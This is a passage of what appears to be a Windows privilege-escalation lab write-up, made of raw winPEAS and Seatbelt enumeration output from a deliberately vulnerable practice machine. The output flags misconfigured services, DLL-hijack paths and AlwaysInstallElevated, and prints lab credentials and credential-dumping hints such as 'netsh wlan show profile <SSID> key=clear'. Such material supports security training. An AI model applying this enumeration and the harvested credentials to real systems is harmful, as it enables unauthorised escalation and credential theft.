    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 1
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0

  [+] HKLM Internet Settings(T1012)
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])

  [+] AV Information(T1063)
  [X] Exception: Invalid namespace
    No AV was detected!!
    Not Found

  [+] UAC Status(T1012)
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken:
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.


  ===========================================(Users Information)===========================================

  [+] Users(T1087&T1069&T1033)
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: user
  Current groups: Domain Users, Everyone, Users, Builtin\Remote Desktop Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    WIN-QBA94KB3IOF\admin
        |->Groups: Administrators,Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WIN-QBA94KB3IOF\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\user
        |->Groups: Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


  [+] Current Token privileges(T1134)
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

  [+] Clipboard text(T1134)
    Not Found
    [i]     This C# implementation to capture the clipboard is not trustable in every Windows version
    [i]     If you want to see what is inside the clipboard execute 'powershell -command "Get - Clipboard"'

  [+] Logged users(T1087&T1033)
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] RDP Sessions(T1087&T1033)
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#0      user           WIN-QBA94KB3IOF          Active    192.168.144.77

  [+] Ever logged users(T1087&T1033)
    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultUserName               :  admin

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\admin
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]
    C:\Users\user

  [+] Password Policies(T1201)
   [?] Check for a possible brute-force
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)
   at d7.d()
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================



  =======================================(Processes Information)=======================================

  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
    sihost(3544)[C:\Windows\system32\sihost.exe] -- POwn: user
    Command Line: sihost.exe
   =================================================================================================

    winPEASany(5292)[C:\PrivEsc\winPEASany.exe] -- POwn: user -- isDotNet
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: winPEASany.exe
   =================================================================================================

    ShellExperienceHost(3688)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    RuntimeBroker(1120)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    cmd(2492)[C:\Windows\system32\cmd.exe] -- POwn: user
    Command Line: "C:\Windows\system32\cmd.exe"
   =================================================================================================

    wuapihost(5440)[C:\Windows\System32\wuapihost.exe] -- POwn: user
    Command Line: C:\Windows\System32\wuapihost.exe -Embedding
   =================================================================================================

    conhost(3848)[C:\Windows\system32\conhost.exe] -- POwn: user
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    taskhostw(3444)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    SearchUI(1276)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
   =================================================================================================

    dllhost(5008)[C:\Windows\system32\DllHost.exe] -- POwn: user
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    explorer(3944)[C:\Windows\Explorer.EXE] -- POwn: user
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    svchost(3424)[C:\Windows\system32\svchost.exe] -- POwn: user
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    RuntimeBroker(1056)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    rdpclip(3412)[C:\Windows\System32\rdpclip.exe] -- POwn: user
    Command Line: rdpclip
   =================================================================================================

    RuntimeBroker(788)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    taskhostw(5644)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe Install $(Arg0)
   =================================================================================================



  ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
   =================================================================================================

    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
   =================================================================================================

    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
   =================================================================================================

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================

    regsvc(Insecure Registry Service)["C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
   =================================================================================================

    winexesvc(winexesvc)[winexesvc.exe] - Manual - Stopped
   =================================================================================================

    PSEXESVC(Sysinternals - PSEXESVC)[C:\Windows\PSEXESVC.exe] - Manual - Running
   =================================================================================================


  [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])

  [+] Checking write permissions in PATH folders (DLL Hijacking)()
   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps

    (DLL Hijacking) C:\Temp: Users [AppendData/CreateDirectories WriteData/CreateFiles]


  ====================================(Applications Information)====================================

  [+] Current Active Window Application(T1010&T1518)
    Command Prompt - winPEASany.exe

  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\Amazon
    C:\Program Files\Autorun Program
    C:\Program Files\Common Files
    C:\Program Files\DACL Service
    C:\Program Files\desktop.ini
    C:\Program Files\DLL Hijack Service
    C:\Program Files\File Permissions Service
    C:\Program Files\Insecure Registry Service
    C:\Program Files\internet explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Unquoted Path Service(Users [AllAccess])
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


  [+] Autorun Applications(T1010)
   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
   at System.ThrowHelper.ThrowKeyNotFoundException()
   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
   at d4.ap()

  [+] Scheduled Applications --Non Microsoft--(T1010)
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.
File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'
   at dx.a()
   at d4.ao()

WRN: Assembly binding logging is turned OFF.
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
Note: There is some performance penalty associated with assembly bind failure logging.
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].



  =========================================(Network Information)=========================================

  [+] Network Shares(T1135)
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)
   at winPEAS.SamServer.c.d(Boolean A_0)
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

  [+] Host File(T1016)

  [+] Network Ifaces and known hosts(T1016)
   [?] The masks are only for the IPv4 addresses
    Ethernet[02:5B:DB:69:E4:47]: 10.66.172.123, fe80::6036:cb86:8cc6:76f6%15 / 255.255.192.0
        Gateways: 10.66.128.1
        DNSs: 10.66.0.2
        Known hosts:
          10.10.0.1             00-00-00-00-00-00     Invalid
          10.66.128.1           02-C7-F0-88-1A-CD     Dynamic
          10.66.191.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


  [+] Current Listening Ports(T1049&T1049)
   [?] Check for services restricted from the outside
    Proto     Local Address          Foreing Address        State
    TCP       0.0.0.0:135                                   Listening
    TCP       0.0.0.0:445                                   Listening
    TCP       0.0.0.0:3389                                  Listening
    TCP       0.0.0.0:5985                                  Listening
    TCP       0.0.0.0:47001                                 Listening
    TCP       0.0.0.0:49664                                 Listening
    TCP       0.0.0.0:49665                                 Listening
    TCP       0.0.0.0:49667                                 Listening
    TCP       0.0.0.0:49668                                 Listening
    TCP       0.0.0.0:49669                                 Listening
    TCP       0.0.0.0:49670                                 Listening
    TCP       0.0.0.0:49671                                 Listening
    TCP       10.66.172.123:139                             Listening
    TCP       [::]:135                                      Listening
    TCP       [::]:445                                      Listening
    TCP       [::]:3389                                     Listening
    TCP       [::]:5985                                     Listening
    TCP       [::]:47001                                    Listening
    TCP       [::]:49664                                    Listening
    TCP       [::]:49665                                    Listening
    TCP       [::]:49667                                    Listening
    TCP       [::]:49668                                    Listening
    TCP       [::]:49669                                    Listening
    TCP       [::]:49670                                    Listening
    TCP       [::]:49671                                    Listening
    UDP       0.0.0.0:123                                   Listening
    UDP       0.0.0.0:500                                   Listening
    UDP       0.0.0.0:3389                                  Listening
    UDP       0.0.0.0:4500                                  Listening
    UDP       0.0.0.0:5353                                  Listening
    UDP       0.0.0.0:5355                                  Listening
    UDP       10.66.172.123:137                             Listening
    UDP       10.66.172.123:138                             Listening
    UDP       127.0.0.1:62451                               Listening
    UDP       [::]:123                                      Listening
    UDP       [::]:500                                      Listening

  [+] Firewall Rules(T1016)
   [?] Showing only DENY rules (too many ALLOW rules always)
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

  [+] DNS cached --limit 70--(T1016)
    Entry                                 Name                                  Data
    sls.update.microsoft.com              sls.update.microsoft.com              ...prod.dcat.dsp.trafficmanager.net
    sls.update.microsoft.com              ...prod.dcat.dsp.trafficmanager.net   74.179.77.204
    time.windows.com                      time.windows.com                      twc.trafficmanager.net
    time.windows.com                      twc.trafficmanager.net                168.61.215.74


  =========================================(Windows Credentials)=========================================

  [+] Checking Windows Vault()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [X] Exception: Object reference not set to an instance of an object.
    Not Found

  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    This function is not yet implemented.
    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

  [+] Saved RDP connections()
    Not Found

  [+] Recently run commands()
    Not Found

  [+] Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3025105784-3259396213-1915610826-1000\ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
   =================================================================================================


  [+] Checking for Credential Files()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
    Size: 11152
   =================================================================================================

    CredFile: C:\Users\user\AppData\Roaming\Microsoft\Credentials\B7F3DB5C32DA09A1DE92D276CFACAC3B
    Description: Enterprise Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:10 AM
    Modified: 6/5/2020 8:38:10 AM
    Size: 506
   =================================================================================================

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files()
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

  [+] Looking for kerberos tickets()
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking saved Wifis()
    This function is not yet implemented.
    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

  [+] Checking WSUS(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found


  ========================================(Browsers Information)========================================

  [+] Looking for Firefox DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Firefox history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for Chrome DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Chrome history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Chrome bookmarks(T1217)
    Not Found

  [+] Current IE tabs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in IE history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

  [+] IE favorites(T1217)
    http://go.microsoft.com/fwlink/p/?LinkId=255142


  ==============================(Interesting files and registry)==============================

  [+] Putty Sessions()
    SessionName: BWP123F42
    ProxyPassword: password123
    ProxyUsername: admin
   =================================================================================================


  [+] Putty SSH Host keys()
    Not Found

  [+] SSH keys in registry()
   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

  [+] Cloud Credentials(T1538&T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>

  [+] Looking for common SAM & SYSTEM backups()
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM

  [+] Looking for McAfee Sitelist.xml Files()

  [+] Cached GPP Passwords()
  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

  [+] Looking for possible regs with creds(T1012&T1214)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

  [+] Looking for possible password files in users homes(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Searching known files that can contain creds in home(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

  [+] Looking for documents --limit 100--(T1083)
    Not Found

  [+] Recent files --limit 70--(T1083&T1081)
    Not Found

C:\PrivEsc>
```

**Seatbelt.exe** execution:

```bat
C:\PrivEsc>Seatbelt.exe


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


 "SeatBelt.exe system" collects the following system data:

        BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
        RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
        TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
        UACSystemPolicies     -   UAC system policies via the registry
        PowerShellSettings    -   PowerShell versions and security settings
        AuditSettings         -   Audit settings via the registry
        WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
        LSASettings           -   LSA settings (including auth packages)
        UserEnvVariables      -   Current user environment variables
        SystemEnvVariables    -   Current system environment variables
        UserFolders           -   Folders in C:\Users\
        NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
        InternetSettings      -   Internet settings including proxy configs
        LapsSettings          -   LAPS settings, if installed
        LocalGroupMembers     -   Members of local admins, RDP, and DCOM
        MappedDrives          -   Mapped drives
        RDPSessions           -   Current incoming RDP sessions
        WMIMappedDrives       -   Mapped drives via WMI
        NetworkShares         -   Network shares
        FirewallRules         -   Deny firewall rules, "full" dumps all
        AntiVirusWMI          -   Registered antivirus (via WMI)
        InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
        RegistryAutoRuns      -   Registry autoruns
        RegistryAutoLogon     -   Registry autologon information
        DNSCache              -   DNS cache entries (via WMI)
        ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
        AllTcpConnections     -   Lists current TCP connections and associated processes
        AllUdpConnections     -   Lists current UDP connections and associated processes
        NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
         *  If the user is in high integrity, the following additional actions are run:
        SysmonConfig          -   Sysmon configuration from the registry


 "SeatBelt.exe user" collects the following user data:

        SavedRDPConnections   -   Saved RDP connections
        TriageIE              -   Internet Explorer bookmarks and history  (last 7 days)
        DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb
        RecentRunCommands     -   Recent "run" commands
        PuttySessions         -   Interesting settings from any saved Putty configurations
        PuttySSHHostKeys      -   Saved putty SSH host keys
        CloudCreds            -   AWS/Google/Azure cloud credential files
        RecentFiles           -   Parsed "recent files" shortcuts  (last 7 days)
        MasterKeys            -   List DPAPI master keys
        CredFiles             -   List Windows credential DPAPI blobs
        RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files
         *  If the user is in high integrity, this data is collected for ALL users instead of just the current user


 Non-default options:

        CurrentDomainGroups   -   The current user's local and domain groups
        Patches               -   Installed patches via WMI (takes a bit on some systems)
        LogonSessions         -   User logon session data
        KerberosTGTData       -   ALL TEH TGTZ!
        InterestingFiles      -   "Interesting" files matching various patterns in the user's folder
        IETabs                -   Open Internet Explorer tabs
        TriageChrome          -   Chrome bookmarks and history
        TriageFirefox         -   Firefox history (no bookmarks)
        RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
        4624Events            -   4624 logon events from the security event log
        4648Events            -   4648 explicit logon events from the security event log (runas or outbound RDP)
        KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.


 "SeatBelt.exe all" will run ALL enumeration checks, can be combined with "full".


 "SeatBelt.exe [CheckName] full" will prevent any filtering and will return complete results.


 "SeatBelt.exe [CheckName] [CheckName2] ..." will run one or more specified checks only (case-sensitive naming!)

C:\PrivEsc>Seatbelt.exe all


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,



=== Running System Triage Checks ===



=== Basic OS Information ===

  Hostname                      :  WIN-QBA94KB3IOF
  Domain Name                   :
  Username                      :  WIN-QBA94KB3IOF\user
  ProductName                   :  Windows Server 2019 Standard Evaluation
  EditionID                     :  ServerStandardEval
  ReleaseId                     :  1809
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  1
  IsVirtualMachine              :  False
  BootTime (approx)             :  2/14/2026 5:39:22 PM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False


=== Reboot Schedule (event ID 12/13 from last 15 days) ===

  2/14/2026 8:42:09 AM    :  startup


=== Current Privileges ===

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED


=== UAC System Policies ===

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA                      : 1
  LocalAccountTokenFilterPolicy  : 1
    [*] LocalAccountTokenFilterPolicy set to 1.
    [*] Any local account can be used for lateral movement.
  FilterAdministratorToken       :


=== PowerShell Settings ===

  PowerShell v2 Version          : 2.0
  PowerShell v5 Version          : 5.1.17763.1

  Transcription Settings:

  Module Logging Settings:

  Scriptblock Logging Settings:



=== Audit Settings ===



=== WEF Settings ===



=== LSA Settings ===

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : System.Byte[]
  crashonauditfail               : 0
  fullprivilegeauditing          : System.Byte[]
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 768
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1


=== User Environment Variables ===

  COMPUTERNAME                        : WIN-QBA94KB3IOF
  USERPROFILE                         : C:\Users\user
  HOMEPATH                            : \Users\user
  LOCALAPPDATA                        : C:\Users\user\AppData\Local
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  PROCESSOR_ARCHITECTURE              : AMD64
